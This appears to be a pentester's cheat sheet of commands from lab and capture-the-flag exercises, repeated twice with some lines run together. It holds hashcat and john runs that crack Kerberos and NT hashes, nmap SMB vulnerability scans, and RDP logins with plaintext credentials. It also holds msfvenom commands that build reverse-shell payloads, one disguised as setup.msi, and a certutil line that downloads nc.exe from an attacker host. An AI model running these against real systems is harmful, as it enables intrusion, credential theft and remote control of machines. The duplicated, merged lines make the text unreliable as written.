
```
hashcat -m 18200 user3 ../../wordlist/Active-Directory-Wordlists/Pass.txthashcat -m 13100 -a 0 h2.txt ../../wordlist/Active-Directory-Wordlists/Pass.txt
nmap -sV -sC -oA nmap 10.10.83.240

sudo nmap -n -Pn -vv -O -sV --script smb-enum*,smb-ls,smb-mbenum,smb-os-discovery,smb-s*,smb-vuln* 10.10.123.16
sudo nmap -n -Pn -vv -O -sV --script smb-enum*,smb-ls,smb-mbenum,smb-os-discovery,smb-s*,smb-vuln* 10.10.123.16

nmap --script vuln -p 8000 10.10.53.194

xfreerdp /u:wade /p:parzival /w:1366 /h:768 /v:10.10.60.13:3389

xfreerdp /dynamic-resolution +clipboard /cert:ignore /v:MACHINE_IP /u:Administrator /p:'TryH4ckM3!'
sudo nmap -n -Pn -vv -O -sV --script smb-enum*,smb-ls,smb-mbenum,smb-os-discovery,smb-s*,smb-vuln* 10.10.243.191

msfvenom -p windows/meterpreter/reverse_tcp lhost=10.9.239.155 -f msi -o setup.msi
john --format:NT hash.txt /usr/share/wordlists/rockyou.txtrdesktop -u user -p password321 10.10.184.18

certutil -urlcache -f http://<IP>/nc.exe c:\Users\admin\Desktop\nc.exe
hashcat -m 1800 hash.txt /usr/share/wordlists/rockyou.txt

hashcat -m 18200 user3 ../../wordlist/Active-Directory-Wordlists/Pass.txt

hashcat -m 13100 -a 0 h2.txt ../../wordlist/Active-Directory-Wordlists/Pass.txt

nmap -sV -sC -oA nmap 10.10.83.240

sudo nmap -n -Pn -vv -O -sV --script smb-enum*,smb-ls,smb-mbenum,smb-os-discovery,smb-s*,smb-vuln* 10.10.123.16
sudo nmap -n -Pn -vv -O -sV --script smb-enum*,smb-ls,smb-mbenum,smb-os-discovery,smb-s*,smb-vuln* 10.10.123.16

nmap --script vuln -p 8000 10.10.53.194xfreerdp /u:wade /p:parzival /w:1366 /h:768 /v:10.10.60.13:3389

xfreerdp /dynamic-resolution +clipboard /cert:ignore /v:MACHINE_IP /u:Administrator /p:'TryH4ckM3!'

sudo nmap -n -Pn -vv -O -sV --script smb-enum*,smb-ls,smb-mbenum,smb-os-discovery,smb-s*,smb-vuln* 10.10.243.191

msfvenom -p windows/meterpreter/reverse_tcp lhost=10.9.239.155 -f msi -o setup.msi

john --format:NT hash.txt /usr/share/wordlists/rockyou.txt

rdesktop -u user -p password321 10.10.184.18

certutil -urlcache -f http://<IP>/nc.exe c:\Users\admin\Desktop\nc.exe

hashcat -m 1800 hash.txt /usr/share/wordlists/rockyou.txt~                                                                

Saved as: ms17-010.exe

https://ivanitlearning.wordpress.com/2019/02/24/exploiting-ms17-010-without-metasploit-win-xp-sp3/
root@Kali:~/PTP/2.5_Exploitation/Lab 4# msfvenom -p windows/shell_reverse_tcp LHOST=192.168.1.73 LPORT=443 EXITFUNC=thread -f exe -a x86 --platform windows -o ms17-010.exe
```
